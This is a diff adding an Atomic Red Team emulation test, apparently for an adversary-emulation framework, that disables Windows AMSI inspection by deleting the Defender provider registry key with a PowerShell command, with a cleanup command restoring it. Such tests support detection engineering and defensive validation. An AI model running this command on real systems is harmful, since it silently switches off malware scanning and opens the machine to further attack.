@@ -1,0 +1,36 @@
+- id: 13f09b91-c953-438e-845b-b585e51cac9b
+  name: AMSI Bypass - Remove AMSI Provider Reg Key
+  description: 'With administrative rights, an adversary can remove the AMSI Provider
+    registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
+
+    This test removes the Windows Defender provider registry key. Upon execution,
+    no output is displayed.
+
+    Open Registry Editor and navigate to "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\"
+    to verify that it is gone.'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: 'Impair Defenses: Disable or Modify Tools'
+  platforms:
+    windows:
+      psh:
+        command: Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"
+          -Recurse
+        cleanup: New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
+          -ErrorAction Ignore | Out-Null
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1562.001
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-02-21T20:32:20.810Z'
+    atomic_guid: 13f09b91-c953-438e-845b-b585e51cac9b
+    import_timestamp: '2025-06-24T11:15:01.015407Z'
